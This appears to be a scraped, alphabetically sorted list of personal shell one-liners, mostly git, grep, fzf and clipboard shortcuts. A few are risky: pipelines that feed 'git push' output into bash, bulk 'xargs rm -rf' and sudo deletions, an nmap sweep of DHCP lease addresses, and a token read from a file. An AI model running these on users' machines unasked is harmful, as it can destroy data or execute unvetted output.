head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 && echo
head /dev/urandom | tr -dc A-Za-z0-9 | head -c 1000 ; echo ''
head /dev/urandom | tr -dc A-Za-z0-9 | head -c
head /dev/urandom | tr -dc 'A-Za-z0-9!@#%^&*()' | head -c 13 ; echo ''
head /dev/urandom | sha512sum | cut -c 1-10
head -n1 | tr -s ' ' '\n' | cat -n
head -n $((${LINES:-`tput lines 4>/dev/null||echo -n 12`} - 3))
head -n $((${LINES:-`tput lines 2>/dev/null||echo -n 80`} - 7))
head -n $((${LINES:-`tput lines 2>/dev/null||echo -n 25`} - 2))
head -n $((${LINES:-`tput lines 2>/dev/null||echo -n 12`} - 2))
head -c8 /dev/urandom | od -t x8 | awk '{ print \$2 }'
head -c 62 /dev/urandom | /usr/bin/base64 -i - -o - | sed 's/[^a-zA-Z0-9]//g'
head -c 32 /dev/urandom | base64 | head -c 32
head -c 32 /dev/random | base64 | sed
head -c 200 /dev/urandom | base64 | tr -d '=+/'
head -c 16 /dev/urandom | od -An -t x | tr -d ' '
head -c 16 /dev/random | uuencode -m - | sed -ne 2p
head -2 /dev/urandom | sha1sum | base64
head -2 $1| grep -q '{COPYRIGHT-TOP}') && (head -30 $1| grep -q '{COPYRIGHT-END}'
head -1 $1| grep -q '{COPYRIGHT-TOP}') && (head -30 $1| grep -q '{COPYRIGHT-END}'
hcitool con | grep E6:6F:0C:E7:48:91 | awk
hciconfig;hciconfig -a hci0;lsmod |grep bt;dmesg | grep tooth
hash systemctl >/dev/null 2>&1 && systemctl suspend || pm-suspend
handle -s | grep ^Total | sed 's/.*: //'
h | awk '{print \$2}' | awk 'BEGIN{FS=\
gzip | base64 | xsel -b
gzip -9 -c |wc -c | numfmt --to=iec-i --suffix=B --padding=10
gvm use $(gvm list | tail -2 | head -1) && export GOPATH=$PROJECTS_PATH/go/gocode_tools && cd $PROJECTS_PATH/go/gocode_tools
gvm use $(gvm list | tail -2 | head -1) && cd $PROJECTS_PATH/go/modules_go_ws
gvim --remote-tab-silent || gvim
gvim --remote-silent || gvim
gvim $(ls -ctr | grep -v 4096 | tail -n-1)
gtr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | fold -w 12 | head -n 1
gst_tmp=\$(git status | grep Untracked -A 0 -B 999 | grep -v Untracked); if [[ -n \
gst-launch-1.0 ||
gst | grep -E '.+\..+\.orig' | xargs trash
gst --porcelain | grep spec | sed \
gst --porcelain | grep feature | sed \
gss | awk '{print \$2}' | xargs rm -rf
gsm | grep .js | xargs -n1 node_modules/.bin/eslint
gsls \`gsls | fzf | awk '{print \$1}'\`
gsha512sum || true
gsed || true
gsd -n | grep '~' | awk 'END { if (from == \
gs | head -n 1 ; gs | grep \
gs | grep -v \# | awk '{print \
gs | grep 'migrations' | awk '{print \$2}'
gs | grep '^M ' | awk '{print \$2}'
gs | grep 'M ' | awk '{print \
gs | egrep '[ M]{2}' | awk '/[M ]+(.+)\.php/ { system(\
gs | awk '/deleted:(.*)/ {print $3}' | xargs git rm
grunt tidy || grunt tidy
grep sites /opt/bid-router/logs/bid-router.log | grep -v BatchMinus1 | grep --color=auto contains
grep password | sed 's/[^ ]* //' | xclip
grep model\ name /proc/cpuinfo | sed s/model\ name//g | uniq -c
grep ip_address /private/var/db/dhcpd_leases | cut -d= -f2 | nmap -iL - -sn
grep backupd /var/log/system.log | tail && tail -fn 0 /var/log/system.log | grep backupd
grep azureedge ~/src/md-addins/bot-provisioning/Make.config | sed 's/.*=//' | xargs wget -nc
grep alias < ~/.aliases | cut -c 7- | sort
grep VmSwap /proc/1/status /proc/1000536/status /proc/1001394/status /proc/106/status /proc/948228/status /proc/self/status /proc/thread-self/status | sort -k 2 -r | head
grep / | sort | uniq
grep -w -i 'Host' ~/.ssh/config | sed 's/Host //' | grep -v '\*'
grep -vi test | grep -vi stub | grep -vi tcov
grep -vE '^(\s*#|\s*$|;)'
grep -v spec | grep -v features | grep -v oneoff
grep -v grep | awk '{print \$2}' | xargs kill
grep -v \^\-e | cut -d = -f 1 | xargs -n1 pip3 install -U"
grep -v -E '^[ \r\t]*(#|;|\$)'
grep -v 'status\\|trigproc\\|configure' /var/log/dpkg.log
grep -v '^#' | grep -v '^$' | wc -l
grep -v 'X ' |grep -v 'Performing status on ex' |grep -v -e '^$'
grep -v '#' 123 | grep -v '^$' | sed 's/^.*audio\///'
grep -v '#' 123 | grep -v '^$' | sed 's/?\/.*$//'
grep -v $(echo -n '' | shasum) | \
grep -rnws --include='*.[mb][kp]' 'LOCAL_MODULE\|LOCAL_PACKAGE_NAME\|name:'
grep -r . | fzf | fpp
grep -r -n $1 . | grep -v .svn | grep --color $1
grep -r -l -P '\t' ./err.txt ./generated.file ./succ.txt | grep -v eclipse-bin | grep -v build
grep -orh '@.*' ~/Notes/journal | sort | uniq -c
grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' |\
grep -o 'inet6\? \(\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)\|[a-fA-F0-9:]\+\)' \ | \
grep -l '*deleted' /proc/1/maps /proc/1000536/maps /proc/1001394/maps /proc/106/maps /proc/948228/maps /proc/self/maps /proc/thread-self/maps | tr -cd 0-9\\n | xargs -r ps u
grep -i apple /usr/share/nmap/nmap-mac-prefixes | shuf | head
grep -i 'model name' /proc/cpuinfo | sort | uniq
grep -i 'Host ' ~/.ssh/config | cut -d ' ' -f 2 | peco
grep -REn '(>>>|<<<|===)' ./
grep -Pv '(^#|^\s+#|^\s*$)'
grep -P '(^| )\w+\(\)|\bfunction\b'
grep -Ev '^\s*(#|//|$)'
grep -E -v '^\s*($|;|#)'
grep -E -v '^(#|$|;)'
grep -E --color 'error:|warning:|^'
grep -E 'bfgs steps|Total force|!'
grep -E '^[[:space:]]*([[:alnum:]_]+[[:space:]]*\(\)|alias[[:space:]]+[[:alnum:]_]+|function[[:space:]]+[[:alnum:]_]+)'
grep -E '(XXX|TODO|FIXME)'
grep -E '(/\*([^*]|(\*+[^*/]))*\*+/)|(//.*)'
grep -E ""fil(e|es) changed"" | awk "
grep -A 999 sub_domains /var/cpanel/userdata/nobody/main | grep -v sub_domains| sed 's/\ \ \-\ //g'
grep --color=never 'time\|percentage' | sed -e 's/[^0-9]*//'"
grep 'cpu ' /proc/stat | awk '{usage=(\$2+\$4)*100/(\$2+\$4+\$5)} END {print usage}' | awk '{printf(\
grep '^[I\?]' | sed 's/^[I\?] //' |
grep '^#' ~/geek/bible | fzf --preview='grep {} -A10 ~/geek/bible | bat --color=always'
grep '\-login:' /var/log/messages | grep -v 'ansible' | tail -n 40
grep 'Vagrant.require_plugin' Vagrantfile | awk '{print $2}' | sed \
grep 'Build number' /var/opt/microsoft/scxcm.log | awk '{print \$4}' | tail -n 1
grealpath || true
grc ps -aux | \grep -v grep | grep -i
grc cat /var/log/system.log | sort -r | less -R
grb | fzf | xargs git co
grb | fzf | xargs git checkout
gpg --list-keys|grep '^pub'|wc -l
gpg --export --armor | pbcopy | echo '=> Public key copied to pasteboard.'
gp 2>&1 | r 'git push' | xargs -I {} bash -c {}
godoc $(ghq list | peco) | less
godoc $(ghq list --full-path | peco) | $PAGER
go test $(go list ./... | grep -v /vendor/ | grep -v /template/) -cover
go master;git branch --merged|grep -v '^*'|xargs -n 1 git branch -d
go list ./... | grep -v vendor | xargs go test
go list ./... | grep -v vendor | xargs -L 1 golint -set_exit_status
go list '...' | fzf --preview='go doc -all -src {} | bat -l go --color=always'
go install -v $(go list ./... 2> /dev/null | grep -v /vendor/ | grep -v /node_modules/)
go doc -all $(ghq list | fzf) | less
gnome-terminal; } ||
gnome-session-quit --no-prompt || xfce4-session-logout
gnome-session-quit --no-prompt --logout || gnome-session-save --logout
gm && gch -b $(grcdate) || gch $(grcdate) && gps
glxinfo|grep -i direct\ rendering\\\|vendor\ string
glxinfo|egrep 'OpenGL vendor|OpenGL renderer'
glsu | pick | cpin
glsm | pick | cpin
gls -lhXa --color | grep -E .*\.\(tex\|md\)$
gls -d ~/dev/**/.git | xargs -n 1 dirname | xargs gitup --add
gls -1AGh | sort | colorit
glol | emojify | less -r
glol --color | emojify | less
glog | pick | awk
glo |head -n1 |awk '{print $1}'
glg | peco | awk -F ' ' '{ print $NF }'
glast | awk '{print $3}' | cut -d/ -f3
gl | pbcopy; read; gh | pbcopy
gl | head -1 | pbcopy
gl | awk '{print \$1}' | xargs git rebase -i
gitk \$(git branch | sed 's/*//' | sed 's@\<@heads/@' )
github-pull-requests wootric | text-wrap '\`\`\`' | slack-post-message development-discuss
githead | tr -d '\n' | pbcopy
git_prompt_info | cut -d'}' -f2 | cut -d'%' -f1
git_dl && ls --sort=time | head -1 | xargs -I file mv file ~/file && cd
git_dl && ls --sort=time | head -1 | xargs -I file cp file ~/file && cd
git-together with --clear 2>/dev/null || true ; git-together
git-push github || git-push origin
git-log-contributions | git-scoreboard | head -n10
git-list-branches | egrep -i '^s+a+v+.*' | xargs git branch -D
git-comp && git branch -r --merged | grep -v 'master' | xargs git branch -r -d
git-comp && git branch --merged | grep -v 'master' | xargs git branch -d
git-branch | sed 's/ //' | pbcopy
git whatchanged | grep -A 4 commit | less
git url | tr -d '\n' | pbcopy
git tags | sort -r --version-sort | head -n1
git tag |sort -V| tail -n 10
git tag | xargs -I@ git log --format=format:'%ci %H @%n' -1 @ | sort
git tag | tac | head -n10
git tag | sort -V | tail -n 10
git tag | sort -V | tail -n 1
git tag | grep v[0-9] | sort -V
git tag | grep -v jenkins | grep -v hudson
git tag | fzf | xargs git checkout
git tag -l | gsort -V | tail -n 1
git tag --sort=v:refname | egrep '^[v]*\d+(?:\.\d+)*' | tail -n 1
git tag --sort v:refname | grep _test_ | tail -1
git tag --sort v:refname | grep _live_ | tail -1
git tag --list | sort -V | tail -n 1
git symbolic-ref --short HEAD | tr -d '\n' | pbcopy
git symbolic-ref --short HEAD | cat - .github/PULL_REQUEST_TEMPLATE.md | GITHUB_TOKEN=`cat .github_token` hub pull-request -o -F -
git symbolic-ref --short HEAD 2> /dev/null | tr -d '\n' | pbcopy
git submodule foreach -q --recursive 'git checkout $(git config -f $toplevel/.gitmodules submodule.$name.branch || echo master)'
git submodule foreach 'git diff-index --exit-code --quiet HEAD || git commit -a -s -v --gpg-sign' && git commit -a -s -v --gpg-sign
git submodule foreach 'git checkout dev || true'
git st|awk '{print \$2}'|xargs tar cvzf ~/tmp/t.tgz
git status|grep branch|awk
git status|grep 'deleted'|sed 's/.*deleted:[[:space:]]*\(.*\)/\1/'
git status || ls
git status | sed -nE 's/^.*deleted:[[:space:]]+//p' | while read -r line; do git rm
git status | peco | pbcopy
git status | head -n 1 | cut -d' ' -f4-
git status | head -2; git status -s | sort -k 2
git status | head -1 | awk '{print \$3}'
git status | head -1 | awk
git status | grep modified: | xargs
git status | grep modified | less
git status | grep modified | egrep
git status | grep modified | cut --complement -c1-14
git status | grep modified | awk '{print \$2}'
git status | grep deleted | sed 's/^.*:\W*//g'
git status | grep deleted | awk '{\$1=\$2=\
git status | grep deleted | awk
git status | grep both | sed 's/.* //'
git status | grep 'modified' | ruby -e \
git status | grep 'deleted:' | sed -e 's/^.*deleted: *//' -e 's/^/\
git status | grep '^\\s*[a-zA-Z]*:' | awk '{print \$(NF)}'
git status | grep '\.orig' | xargs rm -f
git status \`git status -s |grep -v 'dist/' |cut -b4-\`
git status >/dev/null 2>&1 && cd $(git rev-parse --show-toplevel) || cd
git status 2>/dev/null || (pwd && ls -lF)
git status 2>&1 | head -n 1 | sed s'/On branch //g'
git status 2> /dev/null || echo '${RED}[OOPS]${NORMAL} : Not a git repo'
git status 2> /dev/null || (echo \
git status -uno \`git status -s |grep -v 'dist/' |cut -b4-\`
git status -uall --porcelain | grep [MADRCU] | awk '{print \$2}'
git status -sb | grep -E '^[A|M][\ M]'
git status -s | sk | cut -b 4-
git status -s | sed 's/.* //' | xargs -n1 git difftool
git status -s | grep ^[A-Z] | awk '{ print $2 }'
git status -s | grep ^?? | awk '{print $2}' >> ~/.gitignore_global
git status -s | fzf -m | awk
git status -s | fzf --reverse --height=15 | awk
git status -s | cut -d' ' -f3 | rg --color never spec
git status -s | cut -d ' ' -f 3 | xargs isort
git status -s | cut -d ' ' -f 3 | xargs flake8
git status -s | cut -c4- | xargs touch
git status -s | cut -c4- | xargs rm -r $1
git status -s | cut -c4- | xargs rm
git status -s | cut -c 4- | pbcopy
git status -s | awk '/s/{print $2}' | xargs -n1 php -l
git status -s . | grep '^M ' | awk '{print
git status -s . | grep '^A' | awk '{print
git status -s . | grep '^??' | awk '{print
git status -s . | grep '^ M' | awk '{print
git status --short | egrep '(U[A-Z])|([A-Z]U)'
git status --short | awk '{print $2}' | xargs sed --in-place 's/[[:space:]]\+$//'
git status --short | awk '{print $2}' | xargs -o nvim
git status --short | awk '{print $2}' | xagrs -o vim
git status --short | awk '/^U/{print \$2}' | xargs vim
git status --porcelain | sed -ne 's/^ M //p'| vimargs
git status --porcelain | sed -n '/^D /s/^D //p' | xargs git reset HEAD
git status --porcelain | sed 's/^...//' | xargs -o vim
git status --porcelain | grep '^??' | cut -c4- >>.gitignore
git status --porcelain | grep '^??' | cut -c4- >> .gitignore
git status --porcelain | grep '^.[^D]' | cut -c 3-
git status --porcelain | grep '^ *M' | awk '{ print \$2 }'
git status --porcelain | grep 'MM ' | tr -d 'MM '
git status --porcelain | grep 'M ' | tr -d 'M '
git status --porcelain | cut -f 2 -d ' ' | xargs rm -rf
git status --porcelain | cut -d' ' -f 3 | xargs backup.sh
git status --porcelain | cut -d ' ' -f 2 | tr '\n' ' '
git status --porcelain | cut -c4- | grep
git status --porcelain | awk '{print \$2}' | xargs ~/bin/transmit
git status --porcelain | awk '{ print \$2 }' | xargs -o vim
git status --porcelain | awk '/^ D/{ print \$2 }' | xargs git rm
git status --porcelain 2>/dev/null | sed -ne 's/^ M //p' | xargs vi
git status --porcelain --untracked-files=no | awk '{print \$2}' | xargs bundle exec rubocop -aD
git status --ignored -z | sed -z -e '/^[^!]/d' -e 's/^!! //' | xargs -0 rm -r
git status && git diff | tee /dev/tty | pbcopy
git stat --name-only master | xargs flake8 | grep unused
git stash pop $(git stash list | fzf | cut -d=: -f1)
git stash drop $(git stash list | fzf +m -1 -0 | cut -d
git stash apply $(git stash list | fzf | cut -d
git stash apply $(git stash list | fzf +m -1 -0| cut -d
git stash && gpull && git stash pop || true
git stash && git rev-parse --abbrev-ref HEAD | xargs git pull --rebase origin && git rev-parse --abbrev-ref HEAD | xargs git push origin && git stash pop
git stash && git pull origin `git branch | grep ^* |sed s/\*\ //` && git stash pop
git stash && git pull && git stash pop || true
git st | sed 's/...//' | fzf
git st | grep deleted | sed
git st --porcelain | awk '{print $2}' | xargs eslint --fix
git ss | pbcopy && git ss | cat && echo '(Output above has been copied into clipboard)'
git show-branch | grep '*' | grep -v \
git show-branch | grep '*' | grep -v
git show-branch -a | ack '\*' | ack -v
git show | sed 's/diff --git/\n\n\n\ndiff --git/' | sed -e 's/^ \s*$//' > show.diff && echo 'Sent diff to file show.diff'
git show | grep -e '^commit' | cut -f 2 -d \
git show \$(git log --pretty=oneline | fzf +m | awk '{print \$1}')
git show \$(git log --oneline --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr)%Creset %Cblue[%ce]%Creset' | fzf | awk '{print \$1}')
git show --color --color-words='[^[:space:]]|([[:alnum:]]|UTF_8_GUARD)+'
git show $(gl | fzf | cut -d \ -f1)
git show $(gl --follow $(fzf) | fzf | cut -d \ -f1 )
git show $(git stash list | fzf | cut -d
git show $(git stash list | fzf +m -1 -0 | cut -d
git shortlog | grep -E '^[ ]+\w+' | wc-l
git shortlog | grep -E '^[ ]+\w+' | wc -l
git shortlog | grep -E '^[ ]+\\w+' | wc -l
git shortlog -s | sort -rn | nl
git shortlog -s | sort -rn | head
git shortlog -s | cut -f1 | tr
git shortlog -s | cut -f1 | spark
git rm \$(git status -s | grep D | awk '{print \$2}')
git revert `git reflog | sed '1!d' | colrm 8`
git rev-parse head | xargs echo -n | pbcopy
git rev-parse HEAD | xargs echo -n | pbcopy
git rev-parse HEAD | tr -d '\n' | xclip
git rev-parse HEAD | tr -d '\n' | pbcopy && pbpaste && printf '\n'
git rev-parse HEAD | tr -d '\n' | pbcopy && git rev-parse HEAD
git rev-parse HEAD | tr -d '\n' | pbcopy
git rev-parse HEAD | tr -d '\\n' | pbcopy
git rev-parse HEAD | tr '\n' ' ' | pbcopy
git rev-parse HEAD | head -c 7 | pbcopy
git rev-parse HEAD | cut -c1-7 | tr -d '\n'
git rev-parse 2>/dev/null && git status || ls
git rev-parse --show-toplevel | xargs basename | xargs tmux rename-window
git rev-parse --show-cdup || pwd
git rev-parse --short HEAD | xargs echo -n | pbcopy
git rev-parse --short HEAD | tr -d '\n' | xsel -bi
git rev-parse --short HEAD | tr -d '\n' | xclip
git rev-parse --short HEAD | tee >(tr -d '\040\011\012\015' | pbcopy)
git rev-parse --abbrev-ref HEAD | xargs git pull --rebase origin && git rev-parse --abbrev-ref HEAD | xargs git push origin
git rev-parse --abbrev-ref HEAD | xargs echo -n | pbcopy
git rev-parse --abbrev-ref HEAD | tr -d '\n'| pbcopy
git rev-parse --abbrev-ref HEAD | tr -d '\n' | xclip -selection clipboard
git rev-parse --abbrev-ref HEAD | tr -d '\n' | pbcopy; pbpaste
git rev-parse --abbrev-ref HEAD | tr -d '\n' | pbcopy
git rev-parse --abbrev-ref HEAD | toilet -f future | lolcat -a
git rev-parse --abbrev-ref HEAD | sed 's/feature\///' | xargs git flow feature finish
git rev-list HEAD | wc -l | awk '{print \$1}'
git rev-list HEAD -1 | cut -c1-7 | pbcopy && pbpaste
git rev-list --left-right --count origin/master...origin/`git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/ (\1)/' | sed 's/[() ]//g'`
git rev-list --all | pv | xargs git grep -F
git rev-list --all | head -100 | xargs git log
git rev-list --all --pretty=format:'%cd %Cgreen%an%Creset %Cred%h%Creset - %s' --abbrev-commit --date=short | grep -v ^commit | less -R
git reset HEAD $(git status | fzf -m | cut -d
git reset --hard \`git reflog | fzf | cut -d ' ' -f 1\`
git remote | fzf -1 | xargs -I% git push % $(git_branch)
git remote | fzf -1 | xargs -I% git fetch %
git remote show | sed '/heroku/d' | xargs -I {} git remote update {} --prune; git submodule update
git remote show origin | grep Fetch | awk '{print \$3}'
git remote show origin | awk '/HEAD branch:/ {print \$3}' | xargs git checkout
git remote show -n origin | grep Fetch | cut -d: -f2-
git remote prune origin; git remote prune upstream; git branch --merged master | grep -v 'master$' | xargs git branch -d
git remote prune origin; git branch --merged development | grep -v development | xargs git branch -d
git remote prune origin && git branch -vv | awk '/origin\/.*: gone]/{print\$1}' | xargs git branch -d
git remote prune origin && git br |grep -v master |xargs -I {} git branch -D `$HOME/bin/trim {}`
git remote prune origin && gcm && git branch --merged | grep -v '\*' | xargs -n 1 git branch -d && gco -
git remote get-url origin | sed -e 's/git@github.com:/http:\/\/github.com\//g' | xargs open -a 'Google Chrome'
git remote -v | head -n 1 | awk '{print \$2}'
git remote -v | grep -E '^origin.*\(push\)$' | sed -n 's/^.*git\@github\.com\:\(.*\)\/.*$/\1/p'
git remote -v | grep -E '^origin.*\(push\)$' | sed -n 's/^.*\/\(.*\)\.git.*$/\1/p'
git remote -v | change_git_auth.py s | xargs git remote set-url origin
git remote -v | change_git_auth.py h | xargs git remote set-url origin
git remote -v | change_git_auth.py g | xargs git remote set-url origin
git remote -v | awk '/origin.*push/ {print $2}' | xargs open
git remote -v | awk '/fetch/ {print $2}'| pbcopy
git reflog | head -20 | sed -Ee \
git reflog | grep -A1 pull | head -2
git recursive --label=lines remote-status | grep -v = | column -t
git recent | fzf | xargs git checkout
git recent | fzf --height 40% | xargs -t --no-run-if-empty git checkout
git rebase --continue || git status
git rebase --continue || git merge --continue
git rebase --continue || git cherry-pick --continue
git push || git pull --rebase && git push
git push |& awk 'NR==4' | pbcopy
git push staging `git branch|grep '^*'|awk ' { print $2 }'`:master
git push origin ||git push -u origin
git push origin `git branch | grep ^\* | awk
git push origin \`git status | grep 'On branch' | sed 's/On branch //'\`
git push origin \`git branch | grep '^\*' | sed 's/^\* //'\`
git push origin \`git branch | grep '*' | sed -e 's/* //g'\`
git push origin +$(git branch | grep \* | cut -d
git push origin $(git branch | grep \*|cut -c3-)
git push origin $(git branch | grep \* | cut -d ' ' -f2)
git push origin $(git branch | grep '*' | sed 's/\* //')
git push origin $(gb | grep '^*' | sed 's/* //')
git push 2>&1 | tail -2 | bash
git push 2>&1 | grep git | bash
git push 2> /dev/null || firstpush
git push -u origin \$(git status | grep 'On branch' | sed -e 's/On branch //g')
git push -u origin \$(git branch | grep \* | cut -d ' ' -f2)
git push -u origin \$(git branch | grep \* | cut -d
git push -u origin \$(git branch | grep '\*' | awk '{print \$2}')
git push -u origin $(git status -sb | head -n1 | cut -c 4-)
git push -u origin $(git branch | percol | grep -Eo
git push -u origin $(git branch | grep \* | cut -d
git push --set-upstream origin `git branch | grep \* | cut -d ' ' -f2`
git push --set-upstream origin ` git branch | grep -e '^*' | cut -d ' ' -f 2`
git push --set-upstream origin $(git_branch | tr -d '()' | awk '{print $1}')
git push --set-upstream origin $(git symbolic-ref --short HEAD) || git push
git push --set-upstream git@gitlab.com:nitzan.zada/$(git rev-parse --show-toplevel | xargs basename).git $(git rev-parse --abbrev-ref HEAD) && git remote add origin git@gitlab.com:nitzan.zada/$(git rev-parse --show-toplevel | xargs basename).git && git fetch --all
git pull upstream \$(git status | grep 'On branch' | sed -e 's/On branch //g') --ff-only
git pull origin `git branch | grep ^\* | awk
git pull origin \`git status | grep 'On branch' | sed 's/On branch //'\`
git pull origin \$(git status | grep 'On branch' | sed -e 's/On branch //g') --ff-only
git pull origin $(gs | head -1 | awk '{{ print $3 }}') && git fetch && git rebase origin/master
git pull origin $(git branch | grep \* | cut -d ' ' -f2)
git pull origin $(git branch | grep -E '^\* ' | sed 's/^\* //g') --rebase
git pull github master || git pull origin master
git pull -r || gp
git pull --rebase && ./test.sh && gca && gpush || git reset --hard
git pull --prune; git branch --merged master | grep -v master | xargs git branch -d
git pull --prune && git b --merged | grep -v master | xargs git b -d
git pull --ff-only && (if_migrations_necessary || bundle exec rails db:migrate); git remote prune origin
git prune && git remote prune origin && git branch --merged master | grep -v '^[ *]*master$' | xargs git branch -d -r
git message | pbcopy | pbpaste
git merge \$(git branch | cut -c 3- | pick)
git merge --no-ff $(git branch | grep -v $(git rev-parse --abbrev-ref HEAD) | fzf)
git lx | column -nets '|' 2> /dev/null
git ls-tree -r HEAD | cut -f 2 | grep -E
git ls-tree -r HEAD --name-only | grep -E '*.l?hs$' | xargs fast-tags -v
git ls-tree -r -z --name-only HEAD -- */* | xargs -0 -n1 git blame -f | grep println
git ls-tree -r -z --name-only HEAD -- */* | xargs -0 -n1 git blame -f | grep -e TODO -e THINK
git ls-tree -r -z --name-only HEAD -- **/*.java | xargs -0 -n1 git blame --line-porcelain HEAD |grep
git ls-tree -r -t -l --full-name HEAD | sort -rn -k 4 | less
git ls-tree -r -t -l --full-name HEAD | sort -n -k 4 | tail -n 10
git ls-tree --name-only -r HEAD | grep .go$ | xargs gofmt -w
git ls-remote `git remote get-url --all origin` | grep refs/heads/master | cut -f 1
git ls-files | xargs wc -l | sort -g
git ls-files | xargs ctags -f - | unused --stdin
git ls-files | xargs cat | wc -l
git ls-files | xargs cat | grep TODO
git ls-files | xargs -n1 git --no-pager blame -w | wc
git ls-files | peco | xargs open
git ls-files | peco | xargs atom
git ls-files | grep \.js$ | xargs -L1 -P24 /opt/scale/lib/node_modules/eslint/bin/eslint.js --fix
git ls-files | grep -v go-build | xargs gsed -i
git ls-files | grep -v (lock) | xargs wc -l
git ls-files | grep -v '^\.' | xargs ls
git ls-files | grep '\.swp$' | xargs git rm
git ls-files | fzf | xargs -o nvim
git ls-files lib | xargs ctags -f - | unused --stdin
git ls-files . --ignored --exclude-standard --others | grep migrations | sudo xargs rm -f
git ls-files -z | xargs -0n1 git blame -w | perl -n -e
git ls-files -z | xargs -0 cat | wc -l
git ls-files -v | grep ^h | sed -e 's/^h\ //'
git ls-files -v | grep ^h | cut -c 3-
git ls-files -v | grep ^h | col2
git ls-files -v | grep ^[a-z] | sed -e 's/^h\ //'
git ls-files -v | grep '^[[:lower:]]' | cut -f2 -d' '
git ls-files -v | env --unset=GREP_OPTIONS grep --perl-regexp '^[a-z]\s' | cut --delimiter=' ' --fields=2-
git ls-files -u | cut -f 2 | sort -u
git ls-files -u | awk '{print $4}' | sort -u
git ls-files -oc --exclude-standard | ack -x . | peco
git ls-files -mo | xargs -n1 echo -not -path | xargs find err.txt generated.file succ.txt
git ls-files -mo | fzf -m | xargs -r git add; git status
git ls-files -mo --exclude-standard -z | fzf --multi --preview='show {}' --exit-0 --read0 --print0 --height=70% --reverse | xargs --no-run-if-empty -0 -o vim -o
git ls-files -m | xargs ls -1 2>/dev/null | grep
git ls-files -m | fzf | xargs git checkout
git ls-files -m | fzf -m | xargs
git ls-files -m -o --exclude-standard | tr '\n' ' ' | cpy
git ls-files -m -o --exclude-standard | fzf -m --print0 | xargs -0 -o -t git add -p
git ls-files -m -o --exclude-standard | fzf -m --print0 | xargs -0 -o -t git add
git ls-files -m -o --exclude-standard | fzf --print0 -m --preview 'bat --style=numbers --color=always {}' | xargs -0 -t -o git diff
git ls-files -m -o --exclude-standard | fzf --print0 -m --preview 'bat --style=numbers --color=always {}' | xargs -0 -t -o git add
git ls-files --unmerged | cut -f2 | uniq
git ls-files --unmerged | cut -f2 | sort -u
git ls-files --other --exclude-standard | pick | xargs -I{} rm {}
git ls-files --modified | head -1 | xargs git diff -w
git ls-files --modified | head -1 | xargs git diff
git ls-files --modified | head -1 | xargs git checkout HEAD
git ls-files --modified | head -1 | xargs git add
git ls-files --modified | fzf --reverse --multi | xargs git add && git status --short --branch
git ls-files --modified --others --exclude-standard | peco --initial-filter=Fuzzy | xargs git add --
git ls-files --exclude-standard --modified -z | xargs -0 git ls-files --stage -z | gawk 'BEGIN { RS=\
git ls-files --exclude-standard --modified -z | xargs -0 git ls-files --stage -z | gawk
git ls-files --exclude-standard --modified -z | xargs -0 git ls-files --stage -z | awk 'BEGIN { RS=\
git ls | grep _spec.rb | while read specfile; do echo testing $specfile; bundle exec rspec $specfile; done
git log |grep commit |wc -l
git log | wiconv | less
git log | lolcat | less --raw
git log | head -n1 | awk '{print \$2}'
git log | head -n 1 | awk '{print \$2}'
git log | head -c 48 | awk '{ print \$2 }'
git log | head -1 | cut -c 8-
git log | head -1 | awk -F' ' '{ print \$NF }' > ~/cate_token.txt
git log | head -1 | awk '{print \$2}'
git log | head -1 | awk
git log | grep rtsunoda -B 1 -A 3 | head -n 50
git log | grep hinea -B 2 -A 4 | less
git log | grep git-subtree-dir | sed 's/.*: //'
git log | grep commit | wc -l
git log | grep Author | hist_common.py
git log origin/master..HEAD | grep 'Differential Revision' | grep -o \
git log `git tag --sort version:refname | tail -n 2 | head -n 1`..HEAD
git log HEAD~500...HEAD | grep AUthor | hist_common.py
git log -n1 | head -n1 | grep -Eo '[a-f0-9]{40}'
git log -n 1 | head -n 1 | cut -c 8-14
git log -n 1 | git show -w | d
git log -1|grep 'trunk@'|sed 's/.*trunk@\([0-9]*\).*/\1/'
git log -1 | top | awk '{print $2}'
git log -1 | g_or_native tail -1 | g_or_native awk '{print $1}'
git log -1 | cowsay -f dragon-and-cow | lolcat
git log -1 | cowsay -f beavis.zen | lolcat
git log -1 --pretty=%B | tr -d '\n' | xsel -bi
git log -1 --pretty=%B | tr -d '\n' | pbcopy
git log -1 --pretty=%B | cat | pbcopy
git log --since @{2weeks} --date=local --reverse | grep -P 'Author:\srruiz\s<[\w\d@-]+>(\r|\n)Date:[\s]{3}.*$' > ./Timesheet.txt
git log --since @{2weeks} --date=local --reverse | grep -P 'Author:\sadriaan.scholvinck\s<[\w\d@-]+>(\r|\n)Date:[\s]{3}.*$' > ./Timesheet.txt
git log --pretty=oneline|head -20|tac
git log --pretty=oneline | tac | perl -ne 's/(?<=^.{8}).*?(?= )//g; s/$/*/g; print;'
git log --pretty=oneline --abbrev-commit | fzf --preview 'echo {} | cut -f 1 -d \
git log --pretty=oneline --abbrev-commit --no-merges | fzf --preview 'echo {} | cut -f 1 -d \
git log --pretty=oneline --abbrev-commit --color=always | fzf --preview 'git show {+1} --name-only --color=always' | cut -d' ' -f1
git log --pretty=format:'%h%d %s [%an]' --decorate --all --graph --color=always| ~/.bash/git-log-color.awk | less -RXFS
git log --pretty=format:'%h %ad%x09%an%x09%s' --date=short HEAD...`git describe --tags | cut -c1-25` | trim
git log --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short | cat
git log --pretty=format:'%d' | grep 'tag:' | head -n 1
git log --pretty=format:'%ad [%an] | %s' --date=format:'%d/%m/%y %H:%M' | head
git log --pretty=format:'%aN' | sort | uniq -c
git log --pretty=format:'%Cred%h%Creset | %C(yellow)%ad%Creset | %C(bold blue)%an%Creset - %s - %C(yellow)%d%Creset'
git log --pretty=format:'%C(White)%s' | sort | uniq --unique
git log --pretty=format:%H|tail -1 | xargs git log
git log --pretty=format: --name-status | cut -f2- | sort -u
git log --pretty=format: --name-only --diff-filter=A | sort -u | grep -rnw
git log --pretty=format: --name-only --diff-filter=A | sort - | sed '/^$/d'
git log --pretty=format: --name-only --diff-filter=A | sort - | sed
git log --pretty='%at|%s' | sort -n > gitlog.txt
git log --oneline | pick | awk
git log --oneline | peco | awk
git log --oneline | nl -v0 | sed 's/^ \+/&HEAD~/'
